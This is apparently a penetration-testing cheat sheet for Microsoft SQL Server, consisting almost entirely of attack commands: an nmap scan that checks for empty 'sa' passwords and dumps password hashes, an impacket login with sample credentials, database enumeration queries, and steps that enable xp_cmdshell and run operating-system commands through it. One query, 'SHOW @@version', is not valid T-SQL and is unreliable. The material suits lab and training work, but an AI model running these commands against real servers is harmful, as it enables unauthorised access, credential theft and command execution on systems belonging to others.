### MSSQL Script Scan

```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

### Login as a `mssql` user

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

### Show version

```bash
SHOW @@version;
```

### List all databases

```bash
SELECT name FROM sys.databases;
```

### List the tables in a database

```bash
SELECT * FROM <database_name>.information_schema.tables;
```

### List the contents in a table

```bash
select * from <database_name>.dbo.users;
```

### Enabling `xp_cmdshell`

```bash
## To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

## To update the currently configured value for advanced options.  
RECONFIGURE
GO  

## To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

## To update the currently configured value for this feature.  
RECONFIGURE
GO
```

### Execute `xp_cmdshell`

```bash
EXECUTE xp_cmdshell 'whoami';
```